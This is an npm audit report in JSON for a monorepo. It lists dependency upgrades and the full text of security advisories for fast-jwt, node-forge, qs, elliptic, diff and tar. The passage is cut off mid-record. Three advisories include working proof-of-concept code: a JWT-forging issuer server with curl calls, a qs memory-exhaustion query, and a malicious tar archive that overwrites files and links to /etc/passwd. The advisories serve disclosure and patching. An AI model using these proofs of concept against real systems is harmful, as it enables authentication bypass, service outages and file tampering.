{
  "actions": [
    {
      "isMajor": true,
      "action": "install",
      "resolves": [
        {
          "id": 1103362,
          "path": "auth-api>@fastify/jwt>fast-jwt",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "auth-api",
      "target": "1.0.10"
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1110996,
          "path": "packages__decentralized-core>@libp2p/noise>@libp2p/crypto>node-forge",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1110998,
          "path": "packages__decentralized-core>@libp2p/noise>@libp2p/crypto>node-forge",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1111068,
          "path": "packages__decentralized-core>@libp2p/noise>@libp2p/crypto>node-forge",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "node-forge",
      "target": "1.3.3",
      "depth": 4
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1111755,
          "path": "auth-api>express>qs",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "qs",
      "target": "6.14.1",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112148,
          "path": "auth-api>jest>@jest/core>jest-config>ts-node>diff",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": null,
      "target": null,
      "depth": 5
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112255,
          "path": "packages__ml-client>grpc-tools>@mapbox/node-pre-gyp>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "tar",
      "target": "7.5.3",
      "depth": 4
    },
    {
      "action": "review",
      "module": "elliptic",
      "resolves": [
        {
          "id": 1112030,
          "path": "packages__alpha-exploitation>ethers>@ethersproject/signing-key>elliptic",
          "dev": false,
          "bundled": false,
          "optional": false
        }
      ]
    },
    {
      "action": "review",
      "module": "tar",
      "resolves": [
        {
          "id": 1112255,
          "path": "packages__ml-deployment>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    }
  ],
  "advisories": {
    "1103362": {
      "findings": [
        {
          "version": "3.3.3",
          "paths": [
            "auth-api>@fastify/jwt>fast-jwt"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nearform/fast-jwt/security/advisories/GHSA-gm45-q3v2-6cf8\n- https://github.com/nearform/fast-jwt/commit/cc26b1d473f900446ad846f8f0b10eb1c0adcbdd\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30144\n- https://datatracker.ietf.org/doc/html/rfc7519#page-9\n- https://github.com/advisories/GHSA-gm45-q3v2-6cf8",
      "created": "2025-03-19T15:48:43.000Z",
      "id": 1103362,
      "npm_advisory_id": null,
      "overview": "### Summary\nThe `fast-jwt` library does not properly validate the `iss` claim based on the RFC https://datatracker.ietf.org/doc/html/rfc7519#page-9.\n\n#### Details\nThe `iss` (issuer) claim validation within the fast-jwt library permits an array of strings as a valid `iss` value. This design flaw enables a potential attack where a malicious actor crafts a JWT with an `iss` claim structured as `['https://attacker-domain/', 'https://valid-iss']`. Due to the permissive validation, the JWT will be deemed valid.\n\nFurthermore, if the application relies on external libraries like `get-jwks` that do not independently validate the `iss` claim, the attacker can leverage this vulnerability to forge a JWT that will be accepted by the victim application. Essentially, the attacker can insert their own domain into the `iss` array, alongside the legitimate issuer, and bypass the intended security checks.\n\n#### PoC\nTake a server running the following code:\n\n```js\nconst express = require('express')\nconst buildJwks = require('get-jwks')\nconst { createVerifier } = require('fast-jwt')\n\nconst jwks = buildJwks({ providerDiscovery: true });\nconst keyFetcher = async (jwt) =>\n    jwks.getPublicKey({\n        kid: jwt.header.kid,\n        alg: jwt.header.alg,\n        domain: jwt.payload.iss\n    });\n\n\nconst jwtVerifier = createVerifier({\n    key: keyFetcher,\n    allowedIss: 'https://valid-iss',\n});\n\nconst app = express();\nconst port = 3000;\n\napp.use(express.json());\n\n\nasync function verifyToken(req, res, next) {\n  const headerAuth = req.headers.authorization.split(' ')\n  let token = '';\n  if (headerAuth.length > 1) {\n    token = headerAuth[1];\n  }\n\n  const payload = await jwtVerifier(token);\n\n  req.decoded = payload;\n  next();\n}\n\n// Endpoint to check if you are auth or not\napp.get('/auth', verifyToken, (req, res) => {\n  res.json(req.decoded);\n});\n\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\nNow we build a server that will be used to generate the JWT token and send the verification keys to the victim server:\n\n```js\nconst { generateKeyPairSync } = require('crypto');\nconst express = require('express');\nconst pem2jwk = require('pem2jwk');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\nconst port = 3001;\nconst host = `http://localhost:${port}/`;\n\nconst { publicKey, privateKey } = generateKeyPairSync(\"rsa\", \n    {   modulusLength: 4096,\n        publicKeyEncoding: { type: 'pkcs1', format: 'pem' },\n        privateKeyEncoding: { type: 'pkcs1', format: 'pem' },\n    },\n); \nconst jwk = pem2jwk(publicKey);\n\napp.use(express.json());\n\n// Endpoint to create token\napp.post('/create-token', (req, res) => {\n  const token = jwt.sign({ ...req.body, iss: [host, 'https://valid-iss'],  }, privateKey, { algorithm: 'RS256' });\n  res.send(token);\n});\n\napp.get('/.well-known/jwks.json', (req, res) => {\n    return res.json({\n        keys: [{\n            ...jwk,\n            alg: 'RS256',\n            use: 'sig',\n        }]\n    });\n})\n\napp.all('*', (req, res) => {\n    return res.json({\n        \"issuer\": host,\n        \"jwks_uri\": host + '.well-known/jwks.json'\n    });\n});\n\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\n\n```bash\nexport TOKEN=$(curl -X POST http://localhost:3001/create-token -H \"Content-Type: application/json\" -d '{\"name\": \"test\"}')\ncurl -X GET http://localhost:3000/auth -H \"Authorization: Bearer $TOKEN\"\n```\n\n#### Impact\nApplications relaying on the validation of the `iss` claim by fast-jwt allows attackers to sign arbitrary payloads which will be accepted by the verifier.\n\n#### Solution\nChange https://github.com/nearform/fast-jwt/blob/d2b0ccb103848917848390f96f06acee339a7a19/src/verifier.js#L475 to a validator tha accepts only string for the value as stated in the RFC https://datatracker.ietf.org/doc/html/rfc7519#page-9.",
      "reported_by": null,
      "title": "Fast-JWT Improperly Validates iss Claims",
      "metadata": null,
      "cves": [
        "CVE-2025-30144"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "fast-jwt",
      "vulnerable_versions": "<5.0.6",
      "github_advisory_id": "GHSA-gm45-q3v2-6cf8",
      "recommendation": "Upgrade to version 5.0.6 or later",
      "patched_versions": ">=5.0.6",
      "updated": "2025-03-20T18:58:43.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N"
      },
      "cwe": [
        "CWE-290"
      ],
      "url": "https://github.com/advisories/GHSA-gm45-q3v2-6cf8"
    },
    "1110996": {
      "findings": [
        {
          "version": "1.3.1",
          "paths": [
            "packages__decentralized-core>@libp2p/noise>@libp2p/crypto>node-forge"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/digitalbazaar/forge/security/advisories/GHSA-554w-wpv2-vw27\n- https://github.com/digitalbazaar/forge/commit/260425c6167a38aae038697132483b5517b26451\n- https://github.com/advisories/GHSA-554w-wpv2-vw27",
      "created": "2025-11-26T22:08:37.000Z",
      "id": 1110996,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nAn Uncontrolled Recursion (CWE-674) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft deep ASN.1 structures that trigger unbounded recursive parsing. This leads to a Denial-of-Service (DoS) via stack exhaustion when parsing untrusted DER inputs.\n\n### Details\n\nAn ASN.1 Denial of Service (Dos) vulnerability exists in the node-forge `asn1.fromDer` function within `forge/lib/asn1.js`. The ASN.1 DER parser implementation (`_fromDer`) recurses for every constructed ASN.1 value (SEQUENCE, SET, etc.) and lacks a guard limiting recursion depth. An attacker can craft a small DER blob containing a very large nesting depth of constructed TLVs which causes the Node.js V8 engine to exhaust its call stack and throw `RangeError: Maximum call stack size exceeded`, crashing or incapacitating the process handling the parse. This is a remote, low-cost Denial-of-Service against applications that parse untrusted ASN.1 objects.\n\n### Impact\n\nThis vulnerability enables an unauthenticated attacker to reliably crash a server or client using node-forge for TLS connections or certificate parsing.\n\nThis vulnerability impacts the ans1.fromDer function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. These components may be leveraged by downstream applications in ways that enable full compromise of availability.",
      "reported_by": null,
      "title": "node-forge has ASN.1 Unbounded Recursion",
      "metadata": null,
      "cves": [
        "CVE-2025-66031"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "node-forge",
      "vulnerable_versions": "<1.3.2",
      "github_advisory_id": "GHSA-554w-wpv2-vw27",
      "recommendation": "Upgrade to version 1.3.2 or later",
      "patched_versions": ">=1.3.2",
      "updated": "2025-11-26T22:08:40.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-674"
      ],
      "url": "https://github.com/advisories/GHSA-554w-wpv2-vw27"
    },
    "1110998": {
      "findings": [
        {
          "version": "1.3.1",
          "paths": [
            "packages__decentralized-core>@libp2p/noise>@libp2p/crypto>node-forge"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/digitalbazaar/forge/security/advisories/GHSA-5gfm-wpxj-wjgq\n- https://github.com/digitalbazaar/forge/pull/1124\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667\n- https://kb.cert.org/vuls/id/521113\n- https://www.kb.cert.org/vuls/id/521113\n- https://www.npmjs.com/package/node-forge\n- https://github.com/advisories/GHSA-5gfm-wpxj-wjgq",
      "created": "2025-11-26T22:07:19.000Z",
      "id": 1110998,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nCVE-2025-12816 has been reserved by CERT/CC\n\n**Description**\nAn Interpretation Conflict (CWE-436) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures to desynchronize schema validations, yielding a semantic divergence that may bypass downstream cryptographic verifications and security decisions.\n\n\n### Details\n\nA critical ASN.1 validation bypass vulnerability exists in the node-forge asn1.validate function within `forge/lib/asn1.js`. ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.",
      "reported_by": null,
      "title": "node-forge has an Interpretation Conflict vulnerability via its ASN.1 Validator Desynchronization",
      "metadata": null,
      "cves": [
        "CVE-2025-12816"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "node-forge",
      "vulnerable_versions": "<1.3.2",
      "github_advisory_id": "GHSA-5gfm-wpxj-wjgq",
      "recommendation": "Upgrade to version 1.3.2 or later",
      "patched_versions": ">=1.3.2",
      "updated": "2025-11-26T22:07:20.000Z",
      "cvss": {
        "score": 8.6,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N"
      },
      "cwe": [
        "CWE-436"
      ],
      "url": "https://github.com/advisories/GHSA-5gfm-wpxj-wjgq"
    },
    "1111068": {
      "findings": [
        {
          "version": "1.3.1",
          "paths": [
            "packages__decentralized-core>@libp2p/noise>@libp2p/crypto>node-forge"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/digitalbazaar/forge/security/advisories/GHSA-65ch-62r8-g69g\n- https://github.com/digitalbazaar/forge/commit/3e0c35ace169cfca529a3e547a7848dc7bf57fdb\n- https://nvd.nist.gov/vuln/detail/CVE-2025-66030\n- https://github.com/advisories/GHSA-65ch-62r8-g69g",
      "created": "2025-11-26T22:07:44.000Z",
      "id": 1111068,
      "npm_advisory_id": null,
      "overview": "### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs. These arcs may be decoded as smaller, trusted OIDs due to 32-bit bitwise truncation, enabling the bypass of downstream OID-based security decisions.\n\n### Description\n\nAn ASN.1 OID Integer Truncation vulnerability exists in the node-forge `asn1.derToOid` function within `forge/lib/asn1.js`. OID components are decoded using JavaScript's bitwise left-shift operator (`<<`), which forcibly casts values to 32-bit signed integers. Consequently, if an attacker provides a mathematically unique, very large OID arc integer exceeding $2^{31}-1$, the value silently overflows and wraps around rather than throwing an error. \n\n### Impact\n\nThis vulnerability allows a specially crafted ASN.1 object to spoof an OID, where a malicious certificate with a massive, invalid OID is misinterpreted by the library as a trusted, standard OID, potentially bypassing security controls.\n\nThis vulnerability impacts the `asn1.derToOid` function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. This component may be leveraged by downstream applications in ways that enables partial compromise of integrity, leading to potential availability and confidentiality compromises.",
      "reported_by": null,
      "title": "node-forge is vulnerable to ASN.1 OID Integer Truncation",
      "metadata": null,
      "cves": [
        "CVE-2025-66030"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "node-forge",
      "vulnerable_versions": "<1.3.2",
      "github_advisory_id": "GHSA-65ch-62r8-g69g",
      "recommendation": "Upgrade to version 1.3.2 or later",
      "patched_versions": ">=1.3.2",
      "updated": "2025-12-01T16:02:52.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-190"
      ],
      "url": "https://github.com/advisories/GHSA-65ch-62r8-g69g"
    },
    "1111755": {
      "findings": [
        {
          "version": "6.14.0",
          "paths": [
            "auth-api>express>qs"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p\n- https://nvd.nist.gov/vuln/detail/CVE-2025-15284\n- https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9\n- https://github.com/advisories/GHSA-6rw7-vpxm-498p",
      "created": "2025-12-30T21:02:54.000Z",
      "id": 1111755,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).",
      "reported_by": null,
      "title": "qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion",
      "metadata": null,
      "cves": [
        "CVE-2025-15284"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "qs",
      "vulnerable_versions": "<6.14.1",
      "github_advisory_id": "GHSA-6rw7-vpxm-498p",
      "recommendation": "Upgrade to version 6.14.1 or later",
      "patched_versions": ">=6.14.1",
      "updated": "2025-12-30T21:02:55.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-20"
      ],
      "url": "https://github.com/advisories/GHSA-6rw7-vpxm-498p"
    },
    "1112030": {
      "findings": [
        {
          "version": "6.6.1",
          "paths": [
            "packages__alpha-exploitation>ethers>@ethersproject/signing-key>elliptic"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-14505\n- https://github.com/indutny/elliptic/issues/321\n- https://www.herodevs.com/vulnerability-directory/cve-2025-14505\n- https://github.com/advisories/GHSA-848j-6mx2-7j84",
      "created": "2026-01-08T21:30:34.000Z",
      "id": 1112030,
      "npm_advisory_id": null,
      "overview": "The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.\n\nThis issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).",
      "reported_by": null,
      "title": "Elliptic Uses a Cryptographic Primitive with a Risky Implementation",
      "metadata": null,
      "cves": [
        "CVE-2025-14505"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "elliptic",
      "vulnerable_versions": "<=6.6.1",
      "github_advisory_id": "GHSA-848j-6mx2-7j84",
      "recommendation": "None",
      "patched_versions": "<0.0.0",
      "updated": "2026-01-09T20:19:43.000Z",
      "cvss": {
        "score": 5.6,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-1240"
      ],
      "url": "https://github.com/advisories/GHSA-848j-6mx2-7j84"
    },
    "1112148": {
      "findings": [
        {
          "version": "4.0.2",
          "paths": [
            "auth-api>jest>@jest/core>jest-config>ts-node>diff"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/kpdecker/jsdiff/security/advisories/GHSA-73rr-hh4g-fpgx\n- https://github.com/kpdecker/jsdiff/pull/649\n- https://github.com/kpdecker/jsdiff/commit/15a1585230748c8ae6f8274c202e0c87309142f5\n- https://github.com/advisories/GHSA-73rr-hh4g-fpgx",
      "created": "2026-01-14T21:34:12.000Z",
      "id": 1112148,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nAttempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649",
      "reported_by": null,
      "title": "jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "low",
      "module_name": "diff",
      "vulnerable_versions": "<8.0.3",
      "github_advisory_id": "GHSA-73rr-hh4g-fpgx",
      "recommendation": "Upgrade to version 8.0.3 or later",
      "patched_versions": ">=8.0.3",
      "updated": "2026-01-14T21:34:16.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-400",
        "CWE-1333"
      ],
      "url": "https://github.com/advisories/GHSA-73rr-hh4g-fpgx"
    },
    "1112255": {
      "findings": [
        {
          "version": "7.5.2",
          "paths": [
            "packages__ml-client>grpc-tools>@mapbox/node-pre-gyp>tar"
          ]
        },
        {
          "version": "6.2.1",
          "paths": [
            "packages__ml-deployment>tar"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
      "created": "2026-01-16T21:16:20.000Z",
      "id": 1112255,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
      "reported_by": null,
      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
      "metadata": null,
      "cves": [
        "CVE-2026-23745"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "tar",
      "vulnerable_versions": "<=7.5.2",
      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
